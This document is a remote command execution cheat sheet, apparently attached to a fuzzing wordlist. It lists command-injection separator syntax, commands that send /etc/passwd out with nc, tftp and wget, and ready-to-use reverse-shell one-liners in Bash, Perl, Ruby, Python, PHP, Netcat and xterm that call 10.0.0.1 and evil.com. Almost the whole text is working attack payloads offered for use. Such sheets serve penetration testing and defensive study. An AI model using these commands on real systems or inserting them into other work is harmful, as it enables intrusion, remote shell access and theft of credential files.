Remote Command Exec Cheatsheet

File notes

**source-disc-cmd-exec-traversal.fuzz.txt**

usage
```GET /path/*payload*relative/path/to/target/file/```

**Executing Commands**

Seperating Commands 
``` blah;blah2 ```

PIPES
``` blah ^ blah 2```

AND 
```blah && blah2```

OR
```FAIL || X```

OR 
``` blah%0Dblah2%0Dblah3 ```

Backtick
``` `blah` ```

Background 
``` `blah & blah2` ```

**Exfiltrating Files / Data**

FTP 
Make a new text file, and echo and then redirect to FTP

NC 
``` 'nc -e /bin/sh' ```

NC 
``` 'echo /etc/passwd  | nc host port' ```

TFTP 
``` 'echo put /etc/passwd | tftp host' ```

WGET: 
``` 'wget --post-file /etc/passwd' ```

**One-Liner Reverse Shells**

On the listener 
``` $ nc -l -p 8080 -vvv' ```

On the remote host...
Bash:
``` $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 ```

``` $ exec 5<>/dev/tcp/evil.com/8080 ```
'$ cat <&5 | while read line; do $line 2>&5 >&5; done'

Perl
```$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ```

Ruby
``` $ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ```

Python
``` $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```

PHP
``` $ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' ```
(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)

Netcat
``` $ nc -e /bin/sh 10.0.0.1 1234 ```

``` $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ```

```
XTERM:
Server: 
$ xterm -display 10.0.0.1:1
Listener:
$ Xnest :1
$ xhost +targetip
```



More docs: /docs/attack-docs/remote-cmd-exfiltration/
